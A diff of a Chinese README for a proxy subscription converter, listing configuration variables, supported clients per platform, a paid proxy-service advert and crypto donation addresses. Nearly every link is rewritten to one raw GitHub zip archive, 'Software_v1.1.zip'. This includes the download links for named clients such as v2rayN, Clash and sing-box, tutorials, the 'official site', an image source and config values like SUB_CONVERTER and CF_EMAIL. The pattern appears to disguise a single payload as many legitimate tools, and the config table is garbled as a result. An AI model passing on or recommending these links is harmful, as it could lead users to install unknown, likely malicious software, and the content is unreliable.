+| SUB_CONFIG       | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |❌| clash、singbox等 订阅转换配置文件  ||
+| SUB_CONVERTER    | https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip                    |❌| clash、singbox等 订阅转换后端的api地址                               ||
+| PROT_TYPE        | 默认空          |❌|      默认空,就是生成vless和trojan节点，vless(只生成vless节点)，trojan(只生成trojan节点)           | [视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |
+| NIP_HOST | https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip(默认) |❌| 优先IP时需要的nip服务 | |
+| EXTRA_IP | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |❌| 优先IP时需要的nip服务 | |
+| EXTRA_IP_PROXY | [https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |❌| 优先IP时需要的nip服务 | |
 | CF_NAMESPACE_ID  | 37cf3x8xxx(Vercel方式部署才需求)     |❌ | 优先IP时需要CF的KV存桶ID（存储和数据库->Workers KV->创建的命名空间ID）        ||
 | CF_ACCOUNT_ID    | 0b0e49ba2xxxx(Vercel方式部署才需求)  |❌ | 优先IP时需要CF的帐号ID（计算和AI->Account Details->Account ID）         ||
-| CF_EMAIL         | https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip(Vercel方式部署才需求)  |❌ | 优先IP时需要CF的帐号邮箱        ||
+| CF_EMAIL         | https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip(Vercel方式部署才需求)  |❌ | 优先IP时需要CF的帐号邮箱        ||
 | CF_API_KEY       | 49ba2xxxx(Vercel方式部署才需求)      |❌ | 优先IP时需要CF的API令牌（管理帐户->帐户API令牌->创建的令牌D）          ||
 
-- 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip
+- 本频道订阅器转换地址：https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip
   
 ## 
-### 🛠已适配订阅工具 [点击进入视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) [点进进入karing视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+### 🛠已适配订阅工具 [点击进入视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) [点进进入karing视频教程](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 <details>
 <summary>点击展开/收起</summary>
 
 - Mac（苹果电脑）
-   - [v2rayU](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [Quantumult X](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [小火箭](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [surge](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  | [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [openclash](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+   - [v2rayU](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [Quantumult X](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [小火箭](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [surge](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  | [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [openclash](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
 - Win（win系统电脑）
-   - [v2rayN](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [openclash](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  | [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+   - [v2rayN](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [openclash](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  | [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
      
 - IOS（苹果手机）
-   - [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [Quantumult X](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  |  [小火箭](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)  |  [surge](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+   - [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [Quantumult X](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  |  [小火箭](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)  |  [surge](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
      
 - Android（安卓手机）
-   - [v2rayNG](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) |  [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) | [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+   - [v2rayNG](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [clash-verge-rev](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [sing-box](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [Clash Nyanpasu](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) |  [karing](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) | [Hiddify](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
 - 软路由
-   - [openclash(https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip) 
+   - [openclash(https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip) 
   
 </details>
 
 ##
 ###  🌟推荐
 **【流量光】** 中转+专线高速机场 (**9.9元300G每月**) (**75元包年每月300G**) (**55元1000GB不限时**)✅畅爽晚高峰 解锁ChatGPT、全流媒体(送小火箭)
-</br>🌐官网：[https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip)
+</br>🌐官网：[https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip](https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip)
 
 # 
 <center>
@@ -191,7 +191,7 @@
 - **TRX-TRC20:** `TWTxUyay6QJN3K4fs4kvJTT8Zfa2mWTwDD`
 
 <div align="center"> 
-  <img src="https://github.com/newbieyan13/amsub/raw/refs/heads/main/public/Software_v3.8.zip" width="200"></br> 
+  <img src="https://github.com/newbieyan13/amsub/raw/refs/heads/main/core/Software_v1.1.zip" width="200"></br> 
   TRC10/TRC20扫码支付 
 </div> 
 </details>
